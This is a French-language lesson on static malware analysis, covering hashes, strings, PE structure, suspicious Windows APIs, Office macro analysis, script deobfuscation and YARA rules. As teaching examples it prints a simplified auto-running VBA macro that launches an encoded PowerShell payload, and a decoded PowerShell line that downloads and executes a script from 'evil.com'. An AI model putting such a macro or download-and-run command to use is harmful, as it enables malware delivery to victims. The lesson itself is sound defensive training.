# Analyse statique

**Durée : 55 min**

## Ce que vous allez apprendre dans ce cours

L'analyse statique est la première étape de toute investigation de malware. Elle permet d'examiner un fichier suspect sans l'exécuter, donc sans risque d'infection. Dans cette leçon, vous allez :

- comprendre les principes, avantages et limites de l'analyse statique,
- calculer les hashes d'un fichier et les rechercher sur les plateformes de renseignement,
- extraire et interpréter les chaînes de caractères d'un exécutable,
- identifier le type réel d'un fichier et détecter le packing,
- analyser la structure d'un fichier PE Windows (headers, sections, imports),
- reconnaître les API Windows suspectes utilisées par les malwares,
- analyser des documents Office malveillants et des scripts obfusqués,
- écrire et utiliser des règles YARA pour la détection.

---

## 1. Principes de l'analyse statique

### 1.1 Définition

L'analyse statique consiste à examiner un malware **sans l'exécuter**. Vous inspectez le fichier tel qu'il existe sur le disque : sa structure, son code, ses métadonnées, ses chaînes de caractères et ses dépendances.

### 1.2 Avantages

| Avantage | Explication |
|----------|-------------|
| **Sécurité** | Le malware n'est jamais exécuté, donc aucun risque d'infection |
| **Rapidité** | Les premières analyses (hash, strings, type) prennent quelques secondes |
| **Capacités potentielles** | Permet d'identifier ce que le malware *pourrait* faire (imports, strings) |
| **Pas besoin de sandbox** | Peut être réalisée sur n'importe quelle machine (avec précaution) |
| **Reproductibilité** | Les résultats sont identiques à chaque analyse du même fichier |

### 1.3 Limites

| Limite | Explication |
|--------|-------------|
| **Obfuscation** | Le code peut être volontairement rendu illisible |
| **Packing** | L'exécutable peut être compressé/chiffré, masquant le code réel |
| **Chiffrement** | Les chaînes de caractères et le code peuvent être chiffrés |
| **Code dynamique** | Le comportement réel peut dépendre de conditions d'exécution |
| **Compétences requises** | L'analyse avancée (désassemblage) demande des connaissances en reverse engineering |

---

## 2. Analyse statique de base

### 2.1 Hashing : identifier le sample

Le **hash** (empreinte) d'un fichier est une valeur unique calculée à partir de son contenu. Deux fichiers identiques produisent toujours le même hash. Modifier un seul octet change complètement le hash.

**Algorithmes courants :**

| Algorithme | Longueur | Usage |
|------------|----------|-------|
| **MD5** | 128 bits (32 caractères hex) | Recherche rapide, identification (non sûr cryptographiquement) |
| **SHA-1** | 160 bits (40 caractères hex) | Encore utilisé par certaines plateformes, obsolète en crypto |
| **SHA-256** | 256 bits (64 caractères hex) | Standard actuel, recommandé pour l'identification |

**Commandes :**

```bash
# Linux
md5sum sample.exe
# Résultat : d41d8cd98f00b204e9800998ecf8427e  sample.exe

sha256sum sample.exe
# Résultat : e3b0c44298fc1c149afbf4c8996fb924...  sample.exe

# Calculer les deux d'un coup
md5sum sample.exe && sha256sum sample.exe
```

```powershell
# Windows (PowerShell)
Get-FileHash -Algorithm MD5 .\sample.exe
Get-FileHash -Algorithm SHA256 .\sample.exe

# Résultat :
# Algorithm  Hash                                    Path
# ---------  ----                                    ----
# SHA256     E3B0C44298FC1C149AFBF4C8996FB924...    C:\samples\sample.exe
```

**Recherche sur VirusTotal :**

Une fois le hash calculé, recherchez-le sur [VirusTotal](https://www.virustotal.com) :
- Si le fichier est connu : vous obtenez un rapport avec le taux de détection par les antivirus
- Si le fichier est inconnu : cela peut indiquer un malware ciblé (APT) ou un fichier légitime rare

> **Astuce** : utilisez aussi [MalwareBazaar](https://bazaar.abuse.ch) pour rechercher le hash. Cette plateforme fournit des informations supplémentaires (famille de malware, tags, IOCs associés).

### 2.2 Strings : extraire les chaînes de caractères

L'extraction de **strings** (chaînes de caractères lisibles) d'un fichier binaire peut révéler des informations précieuses sur le comportement du malware.

**Commandes :**

```bash
# Linux - commande strings (extrait les chaînes ASCII d'au moins 4 caractères)
strings sample.exe

# Filtrer les résultats avec grep
strings sample.exe | grep -i "http"
strings sample.exe | grep -i "password"
strings sample.exe | grep -iE "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"  # IPs

# Extraire les chaînes Unicode (Windows utilise souvent UTF-16LE)
strings -e l sample.exe    # Little-endian 16-bit (UTF-16LE)
```

```powershell
# Windows - FLOSS (FireEye Labs Obfuscated String Solver)
# FLOSS est supérieur à strings car il décode aussi les chaînes obfusquées
floss.exe sample.exe

# FLOSS extrait :
# - Les chaînes ASCII/Unicode standard
# - Les chaînes décodées par des routines de déobfuscation
# - Les chaînes déchiffrées en mémoire (statiquement)
```

**Que chercher dans les strings :**

| Type de chaîne | Exemple | Signification |
|----------------|---------|---------------|
| **URLs** | `http://evil.com/update.php` | Communication C2, téléchargement de payload |
| **Adresses IP** | `185.220.101.42` | Serveur C2 ou d'exfiltration |
| **Chemins de fichiers** | `C:\Windows\Temp\svchost.exe` | Fichier droppé par le malware |
| **Clés de registre** | `SOFTWARE\Microsoft\Windows\CurrentVersion\Run` | Mécanisme de persistance |
| **Noms de DLL** | `kernel32.dll`, `ws2_32.dll` | Bibliothèques utilisées (réseau, système) |
| **Fonctions API** | `CreateRemoteThread`, `VirtualAllocEx` | Capacités du malware (injection, etc.) |
| **Messages d'erreur** | `Connection failed`, `File not found` | Indices sur le fonctionnement interne |
| **Noms d'utilisateur** | `admin`, `Administrator` | Cibles du malware |
| **Commandes** | `cmd.exe /c`, `powershell -enc` | Exécution de commandes système |
| **Mutex** | `Global\MyMutex123` | Identifiant unique du malware (évite les doubles exécutions) |

### 2.3 Identification du type de fichier

Un fichier malveillant peut avoir une extension trompeuse (un `.pdf` qui est en réalité un `.exe`). L'identification du type réel repose sur les **magic bytes** (premiers octets du fichier).

**Commandes :**

```bash
# Linux - commande file
file sample.exe
# Résultat : sample.exe: PE32 executable (GUI) Intel 80386, for MS Windows

file document.pdf
# Si c'est un faux PDF :
# Résultat : document.pdf: PE32 executable (GUI) Intel 80386, for MS Windows

# Afficher les premiers octets en hexadécimal
xxd sample.exe | head -5
```

**Magic bytes courants :**

| Magic bytes (hex) | Signature ASCII | Type de fichier |
|--------------------|-----------------|-----------------|
| `4D 5A` | `MZ` | PE executable (Windows .exe, .dll) |
| `7F 45 4C 46` | `.ELF` | ELF executable (Linux) |
| `50 4B 03 04` | `PK..` | ZIP (aussi .docx, .xlsx, .jar, .apk) |
| `25 50 44 46` | `%PDF` | PDF |
| `D0 CF 11 E0` | `....` | OLE2 (ancien format Office .doc, .xls) |
| `FF D8 FF` | `...` | JPEG |
| `89 50 4E 47` | `.PNG` | PNG |
| `52 61 72 21` | `Rar!` | Archive RAR |
| `CA FE BA BE` | `....` | Java class / Mach-O fat binary |

**Outils avancés :**

| Outil | Plateforme | Description |
|-------|------------|-------------|
| **TrID** | Windows/Linux | Identification par base de signatures (plus de 18 000 types) |
| **DIE (Detect It Easy)** | Windows/Linux | Identification du type, du compilateur et du packer |
| **Exeinfo PE** | Windows | Identification du packer et du compilateur pour les fichiers PE |

### 2.4 Détection de packing

Le **packing** est une technique qui consiste à compresser et/ou chiffrer un exécutable pour masquer son contenu réel. Un fichier packé contient un "stub" (décompresseur) qui restaure le code original en mémoire lors de l'exécution.

**Pourquoi les malwares sont packés :**
- Échapper aux signatures des antivirus
- Rendre l'analyse statique difficile
- Réduire la taille du fichier

**Packers courants :**

| Packer | Type | Détection |
|--------|------|-----------|
| **UPX** | Open source, légitime | Facile (strings "UPX", outils standard) |
| **Themida** | Commercial, protecteur | Moyen (anti-debugging, anti-VM intégrés) |
| **VMProtect** | Commercial, virtualisation | Difficile (virtualise le code) |
| **Custom packer** | Développé par l'attaquant | Très difficile (pas de signature connue) |

**Détection par l'entropie :**

L'**entropie** mesure le caractère aléatoire des données. Un code normal a une entropie moyenne, tandis qu'un code compressé ou chiffré a une entropie élevée.

| Entropie (0-8) | Interprétation | Probabilité de packing |
|-----------------|----------------|------------------------|
| **0 - 1** | Données très structurées (texte, code ASCII) | Très faible |
| **1 - 4** | Code compilé standard, données mixtes | Faible |
| **4 - 6** | Code avec quelques sections compressées | Possible (à investiguer) |
| **6 - 7** | Forte compression ou chiffrement partiel | Probable |
| **7 - 8** | Données chiffrées ou fortement compressées | Très probable (quasi certain) |

**Outils de détection :**

```bash
# DIE (Detect It Easy) - détecte le packer utilisé
diec sample.exe
# Résultat possible : UPX(3.96)[NRV,brute]

# PEStudio - affiche l'entropie par section
# Section .text : entropie 6.2 → normal
# Section .rsrc : entropie 7.8 → probablement packé

# Unpacking d'un fichier UPX
upx -d sample_packed.exe -o sample_unpacked.exe
```

---

## 3. Analyse de fichiers PE (Portable Executable)

### 3.1 Structure d'un fichier PE

Le format **PE (Portable Executable)** est le format standard des exécutables Windows (.exe, .dll, .sys, .ocx). Comprendre sa structure est fondamental pour l'analyse de malware Windows.

```
┌──────────────────────┐
│    DOS Header        │  ← Commence par "MZ" (magic bytes)
│    (64 octets)       │  ← Contient e_lfanew (offset vers PE Header)
├──────────────────────┤
│    DOS Stub          │  ← "This program cannot be run in DOS mode."
├──────────────────────┤
│    PE Signature      │  ← "PE\0\0" (4 octets)
├──────────────────────┤
│    COFF Header       │  ← Machine, nombre de sections, timestamp
│    (20 octets)       │
├──────────────────────┤
│    Optional Header   │  ← Entry Point, ImageBase, Subsystem
│    (variable)        │  ← Data Directories (imports, exports, etc.)
├──────────────────────┤
│    Section Headers   │  ← Table décrivant chaque section
├──────────────────────┤
│    .text             │  ← Code exécutable
├──────────────────────┤
│    .rdata            │  ← Données en lecture seule (imports, strings)
├──────────────────────┤
│    .data             │  ← Données globales initialisées
├──────────────────────┤
│    .rsrc             │  ← Ressources (icônes, dialogues, version info)
├──────────────────────┤
│    .reloc            │  ← Table de relocation
└──────────────────────┘
```

**Sections importantes pour l'analyse de malware :**

| Section | Contenu | Intérêt pour l'analyse |
|---------|---------|------------------------|
| **.text** | Code exécutable | Le code du malware lui-même |
| **.rdata** | Import Address Table, strings constantes | API utilisées, chaînes intéressantes |
| **.data** | Variables globales | Données de configuration du malware |
| **.rsrc** | Ressources embarquées | Peut contenir des payloads cachés, des fichiers droppés |
| **.reloc** | Table de relocation | Présence inhabituelle peut indiquer un packer |

### 3.2 Outils d'analyse PE

| Outil | Description | Usage principal |
|-------|-------------|-----------------|
| **PEStudio** | Analyse statique de fichiers PE, détection d'anomalies | Premier outil à utiliser, vue d'ensemble rapide |
| **PE-bear** | Éditeur et analyseur de PE avec interface graphique | Inspection détaillée des headers et sections |
| **CFF Explorer** | Éditeur de PE avancé | Modification et analyse de la structure PE |
| **DIE** | Détection de packer, compilateur, protector | Identification rapide du type de build |
| **Ghidra** | Désassembleur/décompileur (NSA) | Analyse de code avancée, reverse engineering |
| **IDA Free** | Désassembleur de référence | Analyse de code avancée |

### 3.3 Imports et Exports

Les **imports** indiquent quelles fonctions de DLL le programme utilise. Les **exports** indiquent quelles fonctions le programme met à disposition d'autres programmes (principalement pour les DLL).

L'analyse des imports est un des moyens les plus efficaces pour comprendre les capacités d'un malware.

**DLL suspectes :**

| DLL | Fonctionnalité | Pourquoi c'est suspect |
|-----|----------------|------------------------|
| `ws2_32.dll` | Windows Sockets (réseau) | Communication réseau, C2 |
| `wininet.dll` | API Internet (HTTP, FTP) | Téléchargement, communication C2 |
| `advapi32.dll` | Services, registre, crypto | Persistance, élévation de privilèges |
| `crypt32.dll` | Fonctions cryptographiques | Chiffrement (ransomware, C2 chiffré) |
| `ntdll.dll` | API native (bas niveau) | Appels directs au noyau (évasion) |
| `user32.dll` | Interface utilisateur | Keylogging, screenshots |

### 3.4 API Windows suspectes

| API | DLL | Technique | Signification |
|-----|-----|-----------|---------------|
| `CreateRemoteThread` | kernel32 | Injection de code | Crée un thread dans un autre processus |
| `VirtualAllocEx` | kernel32 | Injection de code | Alloue de la mémoire dans un autre processus |
| `WriteProcessMemory` | kernel32 | Injection de code | Écrit dans la mémoire d'un autre processus |
| `NtUnmapViewOfSection` | ntdll | Process hollowing | Vide un processus pour y injecter du code |
| `SetWindowsHookEx` | user32 | Keylogging / Injection | Installe un hook global (capture clavier, etc.) |
| `URLDownloadToFile` | urlmon | Téléchargement | Télécharge un fichier depuis Internet |
| `InternetOpen` | wininet | Communication C2 | Initialise une connexion Internet |
| `HttpSendRequest` | wininet | Communication C2 | Envoie une requête HTTP |
| `RegSetValueEx` | advapi32 | Persistance | Modifie une clé de registre |
| `CreateService` | advapi32 | Persistance | Crée un service Windows |
| `WinExec` | kernel32 | Exécution | Exécute une commande système |
| `ShellExecute` | shell32 | Exécution | Lance un programme ou ouvre un fichier |
| `GetAsyncKeyState` | user32 | Keylogging | Capture l'état des touches du clavier |
| `CryptEncrypt` | advapi32 | Ransomware | Chiffre des données |
| `IsDebuggerPresent` | kernel32 | Anti-analyse | Détecte si un débogueur est attaché |
| `GetTickCount` | kernel32 | Anti-analyse | Mesure le temps (détection de sandbox) |
| `FindWindow` | user32 | Anti-analyse | Recherche des fenêtres (détection de VM/outils) |

> **À noter** : la présence d'une API suspecte ne signifie pas automatiquement que le fichier est malveillant. Des logiciels légitimes peuvent utiliser ces API. C'est la combinaison de plusieurs indicateurs qui permet de conclure.

---

## 4. Analyse de documents Office malveillants

Les documents Microsoft Office (.doc, .docx, .xls, .xlsm) sont un vecteur d'infection très courant. Les attaquants y intègrent des **macros VBA** (Visual Basic for Applications) malveillantes.

### 4.1 Outils d'analyse

| Outil | Description | Commande |
|-------|-------------|----------|
| **olevba** | Extrait et analyse les macros VBA des fichiers OLE2 et OOXML | `olevba document.doc` |
| **oledump.py** | Analyse les flux OLE2 d'un document | `oledump.py document.doc` |
| **oleid** | Identifie les caractéristiques d'un fichier OLE | `oleid document.doc` |

### 4.2 Exemple : analyse d'un document Word malveillant

```bash
# Étape 1 : Identifier les flux OLE contenant des macros
oledump.py document.doc
# Résultat :
#   1:       114 '\x01CompObj'
#   2:      4096 '\x05DocumentSummaryInformation'
#   3:      4096 '\x05SummaryInformation'
#   4:      7680 '1Table'
#   5:       468 'Macros/PROJECT'
#   6:        86 'Macros/PROJECTwm'
#   7: M   12345 'Macros/VBA/ThisDocument'    ← M = contient une macro
#   8:      5432 'Macros/VBA/_VBA_PROJECT'

# Étape 2 : Extraire la macro du flux 7
oledump.py -s 7 -v document.doc
# Affiche le code VBA de la macro

# Étape 3 : Analyse complète avec olevba
olevba document.doc
# olevba affiche :
# - Le code VBA complet
# - Les indicateurs suspects (AutoOpen, Shell, CreateObject, etc.)
# - Les chaînes décodées
```

**Indicateurs suspects dans les macros VBA :**

| Indicateur | Signification |
|------------|---------------|
| `AutoOpen()` / `Document_Open()` | La macro s'exécute automatiquement à l'ouverture |
| `Shell()` | Exécute une commande système |
| `CreateObject("WScript.Shell")` | Crée un objet shell pour exécuter des commandes |
| `CreateObject("MSXML2.XMLHTTP")` | Crée une connexion HTTP (téléchargement) |
| `Environ("TEMP")` ou `Environ("APPDATA")` | Accède aux dossiers temporaires (dépôt de payload) |
| `Chr()` / `ChrW()` | Reconstitue des chaînes caractère par caractère (obfuscation) |
| `Base64` | Encodage de payload ou de commandes |
| `PowerShell` | Appel à PowerShell (exécution de code avancé) |

### 4.3 Exemple de macro malveillante typique

```vba
' Exemple simplifié d'une macro malveillante
Sub AutoOpen()
    ' S'exécute automatiquement à l'ouverture du document
    Dim cmd As String

    ' Construction de la commande par concaténation (obfuscation basique)
    cmd = "pow" & "ersh" & "ell" & " -e "
    cmd = cmd & "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA..."  ' Base64 encoded payload

    ' Exécution via WScript.Shell
    CreateObject("WScript.Shell").Run cmd, 0, False
End Sub
```

---

## 5. Analyse de scripts malveillants

### 5.1 Techniques d'obfuscation courantes

Les scripts malveillants (PowerShell, JavaScript, VBScript) utilisent des techniques d'obfuscation pour échapper à la détection :

| Technique | Description | Exemple |
|-----------|-------------|---------|
| **Encodage Base64** | Le payload est encodé en Base64 | `powershell -EncodedCommand SQBFAFgA...` |
| **Concaténation** | Les chaînes sont découpées et recollées | `"pow" + "ersh" + "ell"` |
| **Char codes** | Les caractères sont représentés par leur code ASCII | `[char]112 + [char]111 + [char]119 = "pow"` |
| **Variables intermédiaires** | Le code est réparti dans de nombreuses variables | `$a="po"; $b="wer"; $c=$a+$b+"shell"` |
| **Remplacement de chaînes** | Insertion de caractères parasites puis suppression | `"pXoXwXeXrXsXhXeXlXl".Replace("X","")` |
| **Compression** | Le payload est compressé puis décompressé à l'exécution | `IO.Compression.DeflateStream` |
| **Inversion** | La chaîne est inversée | `"llehsrewop" → "powershell"` |

### 5.2 Déobfuscation avec CyberChef

**CyberChef** (disponible sur [gchq.github.io/CyberChef](https://gchq.github.io/CyberChef)) est un outil indispensable pour la déobfuscation. Il permet d'enchaîner des opérations de décodage :

```
Exemple de recette CyberChef pour décoder un payload PowerShell :

1. From Base64
2. Decode text (UTF-16LE)    ← PowerShell encode en UTF-16LE
3. Résultat : le code PowerShell en clair
```

### 5.3 Déobfuscation PowerShell

```powershell
# Décoder un payload PowerShell encodé en Base64
# Le malware exécute : powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0A...

# Pour décoder manuellement :
[System.Text.Encoding]::Unicode.GetString(
    [System.Convert]::FromBase64String("SQBFAFgAIAAoAE4AZQB3AC0A...")
)
# Résultat : IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
```

---

## 6. Règles YARA

### 6.1 Qu'est-ce que YARA ?

**YARA** est un outil de pattern matching conçu pour identifier et classifier les malwares. Il permet de créer des règles qui décrivent des patterns (chaînes de caractères, séquences hexadécimales, expressions régulières) caractéristiques d'une famille de malware.

YARA est utilisé par :
- Les analystes de malware pour la détection
- Les solutions antivirus et EDR comme moteur de règles
- Les plateformes de threat intelligence (VirusTotal, etc.)

### 6.2 Structure d'une règle YARA

```yara
rule NomDeLaRegle
{
    meta:
        author = "Votre nom"
        description = "Description de ce que détecte la règle"
        date = "2025-01-15"
        reference = "URL ou identifiant de référence"

    strings:
        $string1 = "chaîne de texte"
        $string2 = { 4D 5A 90 00 }         // séquence hexadécimale
        $string3 = /https?:\/\/[a-z]+\./    // expression régulière
        $string4 = "chaîne" wide            // UTF-16 (Windows)
        $string5 = "chaîne" nocase          // insensible à la casse

    condition:
        // Condition booléenne utilisant les strings définies
        uint16(0) == 0x5A4D and            // Le fichier commence par "MZ"
        ($string1 or $string2) and
        2 of ($string3, $string4, $string5)
}
```

**Éléments d'une règle YARA :**

| Élément | Description |
|---------|-------------|
| **meta** | Métadonnées descriptives (auteur, date, description) - informatif uniquement |
| **strings** | Patterns à rechercher dans le fichier (texte, hex, regex) |
| **condition** | Expression booléenne qui détermine si la règle matche |

### 6.3 Exemple : règle YARA pour un ransomware simple

```yara
rule Detect_SimpleRansomware
{
    meta:
        author = "Jedha Security"
        description = "Détecte un ransomware basique par ses chaînes caractéristiques"
        date = "2025-01-15"
        severity = "high"

    strings:
        // Chaînes liées au chiffrement
        $ransom1 = "Your files have been encrypted" nocase
        $ransom2 = "Send Bitcoin to" nocase
        $ransom3 = ".locked" nocase

        // API de chiffrement Windows
        $crypto1 = "CryptEncrypt"
        $crypto2 = "CryptGenKey"
        $crypto3 = "CryptAcquireContext"

        // Extensions ciblées
        $ext1 = ".docx"
        $ext2 = ".xlsx"
        $ext3 = ".pdf"
        $ext4 = ".jpg"

    condition:
        uint16(0) == 0x5A4D and           // Fichier PE (Windows)
        1 of ($ransom*) and                // Au moins une chaîne de rançon
        2 of ($crypto*) and                // Au moins 2 API de chiffrement
        3 of ($ext*)                       // Au moins 3 extensions ciblées
}
```

### 6.4 Utilisation de YARA

```bash
# Scanner un fichier avec une règle
yara rule.yar sample.exe
# Résultat : Detect_SimpleRansomware sample.exe

# Scanner un répertoire entier
yara -r rule.yar /chemin/vers/samples/

# Scanner avec plusieurs fichiers de règles
yara -r rules_directory/ sample.exe

# Afficher les chaînes qui ont matché
yara -s rule.yar sample.exe

# Utiliser les règles YARA communautaires
# Cloner le dépôt : git clone https://github.com/Yara-Rules/rules.git
yara -r rules/ sample.exe
```

---

## 7. Workflow d'analyse statique complet

Voici un workflow recommandé pour une analyse statique complète :

| Étape | Action | Outil | Objectif |
|-------|--------|-------|----------|
| 1 | Calculer les hashes | `sha256sum`, `Get-FileHash` | Identifier le sample, rechercher sur VirusTotal |
| 2 | Identifier le type de fichier | `file`, DIE, TrID | Vérifier que l'extension correspond au type réel |
| 3 | Détecter le packing | DIE, PEStudio (entropie) | Savoir si le code est accessible ou packé |
| 4 | Extraire les strings | `strings`, FLOSS | Identifier des IOCs, URLs, chemins, API |
| 5 | Analyser la structure PE | PEStudio, PE-bear | Examiner les imports, sections, anomalies |
| 6 | Identifier les API suspectes | PEStudio | Comprendre les capacités potentielles |
| 7 | Scanner avec YARA | `yara` | Identifier la famille de malware |
| 8 | Analyser les macros (si Office) | olevba, oledump | Extraire le code malveillant |
| 9 | Déobfusquer (si script) | CyberChef | Obtenir le code en clair |
| 10 | Documenter les résultats | Rapport | Résumer les findings et les IOCs |

---

## Glossaire des sigles et définitions

| Sigle/Terme | Définition |
|-------------|------------|
| **PE** | Portable Executable - Format des exécutables Windows |
| **ELF** | Executable and Linkable Format - Format des exécutables Linux |
| **OLE2** | Object Linking and Embedding - Format des anciens documents Office (.doc, .xls) |
| **OOXML** | Office Open XML - Format des documents Office modernes (.docx, .xlsx) |
| **VBA** | Visual Basic for Applications - Langage de macros Microsoft Office |
| **DLL** | Dynamic Link Library - Bibliothèque partagée Windows |
| **API** | Application Programming Interface - Interface de programmation |
| **IAT** | Import Address Table - Table des fonctions importées dans un PE |
| **YARA** | Yet Another Ridiculous Acronym - Outil de pattern matching pour malware |
| **FLOSS** | FireEye Labs Obfuscated String Solver - Outil d'extraction de chaînes obfusquées |
| **DIE** | Detect It Easy - Outil d'identification de fichiers et de packers |
| **UPX** | Ultimate Packer for eXecutables - Packer open source |
| **Entropie** | Mesure du caractère aléatoire des données (0 = ordonné, 8 = aléatoire) |
| **Magic bytes** | Premiers octets d'un fichier identifiant son format |
| **Packing** | Compression/chiffrement d'un exécutable pour masquer son contenu |
| **Obfuscation** | Techniques rendant le code difficile à lire et analyser |
| **LOLBins** | Living-off-the-Land Binaries - Binaires système légitimes détournés |
| **Process Hollowing** | Technique d'injection : vider un processus légitime et y injecter du code |

---

## Récapitulatif des commandes

| Commande | Système | Description |
|----------|---------|-------------|
| `md5sum fichier` | Linux | Calculer le hash MD5 |
| `sha256sum fichier` | Linux | Calculer le hash SHA256 |
| `Get-FileHash -Algorithm SHA256 fichier` | Windows | Calculer un hash |
| `strings fichier` | Linux | Extraire les chaînes ASCII |
| `strings -e l fichier` | Linux | Extraire les chaînes UTF-16LE |
| `floss.exe fichier` | Windows | Extraire les chaînes (dont obfusquées) |
| `file fichier` | Linux | Identifier le type de fichier |
| `diec fichier` | Linux/Win | Détecter le packer avec DIE |
| `upx -d fichier -o output` | Linux/Win | Décompresser un fichier packé avec UPX |
| `olevba document.doc` | Linux/Win | Analyser les macros VBA |
| `oledump.py document.doc` | Linux/Win | Lister les flux OLE2 |
| `oledump.py -s N -v document.doc` | Linux/Win | Extraire le flux N avec décompression |
| `yara rule.yar fichier` | Linux/Win | Scanner un fichier avec une règle YARA |
| `yara -r rule.yar dossier/` | Linux/Win | Scanner récursivement un dossier |
| `yara -s rule.yar fichier` | Linux/Win | Afficher les chaînes matchées |

---

## Ressources pratiques - TryHackMe / HackTheBox

| Plateforme | Room/Lab | Description |
|------------|----------|-------------|
| TryHackMe | [Basic Static Analysis](https://tryhackme.com/room/dvstaticanalysis1) | Exercices pratiques d'analyse statique |
| TryHackMe | [Dissecting PE Headers](https://tryhackme.com/room/dvdissectingpeheaders) | Analyse détaillée de la structure PE |
| HackTheBox | [Challenge - Reminiscent](https://app.hackthebox.com/challenges/Reminiscent) | Analyse forensique d'un fichier malveillant |

---

## Ressources

- Practical Malware Analysis - Michael Sikorski & Andrew Honig (chapitres 1-4)
- PEStudio - Site officiel : [winitor.com](https://www.winitor.com)
- Ghidra - Site officiel : [ghidra-sre.org](https://ghidra-sre.org)
- YARA - Documentation officielle : [yara.readthedocs.io](https://yara.readthedocs.io)
- FLOSS - GitHub : [github.com/mandiant/flare-floss](https://github.com/mandiant/flare-floss)
- oletools - GitHub : [github.com/decalage2/oletools](https://github.com/decalage2/oletools)
- CyberChef : [gchq.github.io/CyberChef](https://gchq.github.io/CyberChef)
- SANS - Malware Analysis Cheat Sheet : [sans.org/posters](https://www.sans.org/posters/malware-analysis-cheat-sheet/)
